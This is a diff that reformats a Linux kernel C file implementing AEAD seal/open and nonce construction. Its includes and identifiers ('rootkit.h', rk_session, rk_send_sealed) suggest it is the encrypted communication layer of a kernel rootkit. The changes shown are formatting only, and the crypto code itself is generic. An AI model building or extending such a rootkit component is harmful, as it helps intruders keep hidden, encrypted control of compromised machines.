@@ -1,23 +1,24 @@
 // SPDX-License-Identifier: GPL-2.0
 // crypto/envelope.c - AEAD envelope: seal, open, nonce construction.
+#include "rootkit.h"
 #include <crypto/aead.h>
 #include <crypto/gcm.h>
 #include <linux/scatterlist.h>
 #include <linux/slab.h>
-#include "rootkit.h"
 
 static void build_nonce(u8 *nonce, u64 session_id, u8 direction, u64 seq)
 {
 	__be64 sid = cpu_to_be64(session_id);
-	__be32 counter = cpu_to_be32((u32)((seq << 1) | (direction == RK_DIR_SERVER)));
+	__be32 counter =
+	    cpu_to_be32((u32)((seq << 1) | (direction == RK_DIR_SERVER)));
 
 	memcpy(nonce, &sid, 8);
 	memcpy(nonce + 8, &counter, 4);
 }
 
-static int aead_seal(struct crypto_aead *tfm, const u8 *nonce,
-	const u8 *aad, size_t aad_len, const u8 *plaintext, size_t pt_len,
-	u8 *out, size_t *out_len)
+static int aead_seal(struct crypto_aead *tfm, const u8 *nonce, const u8 *aad,
+		     size_t aad_len, const u8 *plaintext, size_t pt_len,
+		     u8 *out, size_t *out_len)
 {
 	struct aead_request *req;
 	struct scatterlist sg;
@@ -54,9 +55,9 @@ static int aead_seal(struct crypto_aead *tfm, const u8 *nonce,
 	return error;
 }
 
-static int aead_open(struct crypto_aead *tfm, const u8 *nonce,
-	const u8 *aad, size_t aad_len, const u8 *ct_with_aad, size_t total_len,
-	u8 *out, size_t *out_len)
+static int aead_open(struct crypto_aead *tfm, const u8 *nonce, const u8 *aad,
+		     size_t aad_len, const u8 *ct_with_aad, size_t total_len,
+		     u8 *out, size_t *out_len)
 {
 	struct aead_request *req;
 	struct scatterlist sg;
@@ -116,8 +117,8 @@ int rk_send_sealed(struct rk_session *s, const u8 *data, size_t len)
 	if (!sealed)
 		return -ENOMEM;
 
-	error = aead_seal(s->tfm, nonce, (u8 *)&hdr, RK_HDR_LEN,
-			  data, len, sealed, &sealed_len);
+	error = aead_seal(s->tfm, nonce, (u8 *)&hdr, RK_HDR_LEN, data, len,
+			  sealed, &sealed_len);
 	if (error) {
 		kfree(sealed);
 		return error;
@@ -166,8 +167,8 @@ int rk_recv_sealed(struct rk_session *s, u8 *out, size_t max_len,
 
 	build_nonce(nonce, s->session_id, hdr.direction, seq);
 
-	error = aead_open(s->tfm, nonce, (u8 *)&hdr, RK_HDR_LEN,
-			  frame, frame_len, out, out_len);
+	error = aead_open(s->tfm, nonce, (u8 *)&hdr, RK_HDR_LEN, frame,
+			  frame_len, out, out_len);
 	if (error)
 		goto out_free;
 
